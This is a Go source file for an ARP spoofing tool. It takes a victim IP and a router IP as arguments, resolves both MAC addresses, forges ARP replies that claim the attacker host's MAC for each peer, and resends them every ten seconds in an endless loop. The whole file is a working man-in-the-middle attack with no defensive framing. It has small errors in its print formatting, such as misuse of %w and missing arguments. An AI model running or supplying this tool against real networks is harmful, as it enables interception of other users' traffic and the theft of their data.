package main

import (
	"fmt"
	"github.com/mdlayher/arp"
	"net"
	"net/netip"
	"os"
	"time"
)

var (
	vIP       netip.Addr
	rIP       netip.Addr
	victimIP  net.IP
	routerIP  net.IP
	hostIP    net.IP
	victimMac net.HardwareAddr
	routerMac net.HardwareAddr
	hostMac   net.HardwareAddr
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Error: insufficient number of arguments. Example args: victimIP routerIP")
		return
	}
	fmt.Printf("%s %s\n", os.Args[1], os.Args[2])
	victimIP = net.ParseIP(os.Args[1])
	routerIP = net.ParseIP(os.Args[2])

	if victimIP == nil || routerIP == nil {
		fmt.Println("Error: invalid input data, Example args: 196.168.0.5 196.168.0.1 (first victimIP, second routerIP)")
		return
	}

	vIP = netip.MustParseAddr(os.Args[1])
	rIP = netip.MustParseAddr(os.Args[2])

	ifc, err := findNetInterface()
	if err != nil {
		fmt.Printf("%w", err)
		return
	}
	fmt.Printf("Host mac:%s Host IP: %s\n", hostMac, hostIP)
	fmt.Printf("Interface name:%s\n", ifc.Name)

	cliet, err := arp.Dial(ifc)
	if err != nil {
		fmt.Printf("%w", err)
		return
	}
	defer cliet.Close()

	routerMac, err = cliet.Resolve(rIP)
	if err != nil {
		fmt.Printf("Couldn't find mac for router: %w", err)
		return
	}
	fmt.Printf("Router mac: %s\n", routerMac)

	victimMac, err = cliet.Resolve(vIP)
	if err != nil {
		fmt.Printf("Couldn't find mac for victim: %w", err)
		return
	}
	fmt.Printf("Victim mac: %s\n", victimMac)

	packetForRouter, err := arp.NewPacket(arp.OperationReply, hostMac, vIP, routerMac, rIP)
	if err != nil {
		fmt.Printf("Couldnt create packet for router: %w", err)
		return
	}

	packetForVictim, err := arp.NewPacket(arp.OperationReply, hostMac, rIP, victimMac, vIP)
	if err != nil {
		fmt.Printf("Couldnt create packet for victim: %w", err)
		return
	}

	fmt.Printf("Start spoofing\n")
	for {
		err := cliet.WriteTo(packetForRouter, routerMac)
		if err != nil {
			fmt.Printf("Couldnt send packet to router: %w")
		}
		err = cliet.WriteTo(packetForVictim, victimMac)
		if err != nil {
			fmt.Printf("Couldnt send packet to router: %w")
		}
		time.Sleep(10 * time.Second)
	}
}

func findNetInterface() (*net.Interface, error) {
	ifcs, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, ifc := range ifcs {
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.Contains(victimIP) && ipnet.Contains(routerIP) {
					hostMac = ifc.HardwareAddr
					hostIP = ipnet.IP
					return &ifc, nil
				}
			}
		}
	}
	return nil, fmt.Errorf("Couldn't find the right interface for %s %s", victimIP, routerIP)
}
